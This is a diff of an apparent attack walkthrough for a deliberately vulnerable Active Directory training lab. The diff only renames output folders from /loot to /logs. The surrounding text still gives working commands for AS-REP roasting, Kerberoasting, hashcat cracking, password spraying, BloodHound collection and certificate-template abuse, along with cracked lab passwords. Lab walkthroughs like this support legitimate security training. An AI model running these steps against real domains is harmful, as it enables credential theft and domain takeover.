@@ -6,8 +6,8 @@ if the lab uses another `ip_range`.
 ## §1 Recon
 
 ```bash
-mkdir -p /loot/nmap /loot/hashes /loot/bloodhound
-nmap -Pn -sS --top-ports 1000 --min-rate 1500 -oA /loot/nmap/top \
+mkdir -p /logs/nmap /logs/hashes /logs/bloodhound
+nmap -Pn -sS --top-ports 1000 --min-rate 1500 -oA /logs/nmap/top \
   192.168.56.10-12,192.168.56.22-23
 nxc smb 192.168.56.10-12 192.168.56.22-23
 nxc ldap 192.168.56.10-12
@@ -28,9 +28,9 @@ NORTH often allows more anonymous LDAP than the forest root.
 ## §2 AS-REP roast
 
 ```bash
-nxc ldap 192.168.56.11 -u '' -p '' --asreproast /loot/hashes/asrep-north.txt
-nxc ldap 192.168.56.12 -u '' -p '' --asreproast /loot/hashes/asrep-essos.txt
-hashcat -m 18200 /loot/hashes/asrep-north.txt /usr/share/wordlists/rockyou.txt
+nxc ldap 192.168.56.11 -u '' -p '' --asreproast /logs/hashes/asrep-north.txt
+nxc ldap 192.168.56.12 -u '' -p '' --asreproast /logs/hashes/asrep-essos.txt
+hashcat -m 18200 /logs/hashes/asrep-north.txt /usr/share/wordlists/rockyou.txt
 ```
 
 Expected:
@@ -42,7 +42,7 @@ Expected:
 
 ```bash
 # user=password
-nxc smb 192.168.56.11 -u /loot/users-north.txt -p /loot/users-north.txt --no-bruteforce --continue-on-success
+nxc smb 192.168.56.11 -u /logs/users-north.txt -p /logs/users-north.txt --no-bruteforce --continue-on-success
 # WinterYYYY
 for y in 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026; do
   nxc smb 192.168.56.11 -u rickon.stark -p "Winter$y"
@@ -56,8 +56,8 @@ nxc ldap 192.168.56.11 -u hodor -p hodor --users --kdcHost winterfell.north.seve
 ## §4 Kerberoast
 
 ```bash
-nxc ldap 192.168.56.11 -u hodor -p hodor --kerberoasting /loot/hashes/kerb-north.txt
-hashcat -m 13100 /loot/hashes/kerb-north.txt /usr/share/wordlists/rockyou.txt
+nxc ldap 192.168.56.11 -u hodor -p hodor --kerberoasting /logs/hashes/kerb-north.txt
+hashcat -m 13100 /logs/hashes/kerb-north.txt /usr/share/wordlists/rockyou.txt
 ```
 
 `jon.snow` (`HTTP/thewall`) → `iknownothing`. `sql_svc` is intentionally hard.
@@ -68,7 +68,7 @@ hashcat -m 13100 /loot/hashes/kerb-north.txt /usr/share/wordlists/rockyou.txt
 bloodhound-python -u hodor -p hodor \
   -d north.sevenkingdoms.local \
   -dc winterfell.north.sevenkingdoms.local \
-  -ns 192.168.56.11 -c All --zip -o /loot/bloodhound
+  -ns 192.168.56.11 -c All --zip -o /logs/bloodhound
 ```
 
 Mark owned. Query: shortest path to DA, high-value, Kerberoast, AS-REP,
@@ -142,7 +142,7 @@ From BRAAVOS you are in `essos.local`.
 ## §9 Cross-forest + ESSOS + ADCS
 
 ```bash
-nxc ldap 192.168.56.12 -u missandei -p fr3edom --asreproast /loot/hashes/asrep-essos2.txt
+nxc ldap 192.168.56.12 -u missandei -p fr3edom --asreproast /logs/hashes/asrep-essos2.txt
 certipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -stdout
 # khal GenericAll on ESC4 template → convert to ESC1 and request DA cert
 ```
